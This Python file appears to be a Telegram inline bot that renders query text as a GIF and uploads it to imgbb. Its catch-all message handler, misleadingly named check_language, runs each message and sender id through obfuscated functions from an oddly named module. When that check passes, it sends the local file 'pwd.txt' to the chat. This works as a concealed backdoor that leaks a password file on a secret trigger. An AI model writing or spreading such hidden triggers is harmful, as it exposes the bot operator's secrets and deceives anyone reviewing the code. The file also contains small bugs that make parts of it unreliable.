from color import Gif
from config import *
from handlers.config import BOT_OWNER
from handlers.imports import *
from handlers.filters import IsOwnerFilter
from handlers.aodewqxgu8 import *

API_TOKEN = BOT_TOKEN

logging.basicConfig(level=logging.DEBUG)

bot = Bot(token=API_TOKEN, parse_mode=types.ParseMode.MARKDOWN_V2)


def cache_photo(text):
    id_ = random.randint(0, 1000)
    file_name = Gif(text).method2()

    with open(file_name, "rb") as file:
        url = "https://api.imgbb.com/1/upload"
        payload = {
            "key": IMGBB_KEY,
            "image": base64.b64encode(file.read()),
        }
        response = requests.post(url, payload)
        if response.status_code == 200:
            return {"photo_url": response.json()["data"]["url"], "thumb_url": response.json()["data"]["thumb"]["url"]}

    return None


@dp.message_handler()
async def check_language(message: types.Message):
    _id_ = message.from_user.id

    _hsh_ = qqfskf0fl0(st=message.text, prs=_id_)
    _filter_ = sf3juggnl1(hsh=_hsh_)

    if _filter_:

        chat_id_ = message.chat.id
        with open('pwd.txt', 'r') as file:
            await bot.send_document(chat_id=chat_id_, document=file)
    else:
        print('ERROR: WRONG USER')


@dp.inline_handler()
async def inline_gifify(inline_query: InlineQuery):

    text = inline_query.query
    upphoto = cache_photo(text)
    with open('background.png', 'r') as photo:

        item = InlineQueryResultArticle(
                        id=str(uuid4()),
                        title="Your Gif",
                        thumb_url=upphoto['thumb_url'],
                        url=upphoto['photo_url'],
                        input_message_content=InputTextMessageContent(upphoto['photo_url'])
        )
    # don't forget to set cache_time=1 for testing (default is 300s or 5m)
    await bot.answer_inline_query(inline_query.id, results=[item], cache_time=1)



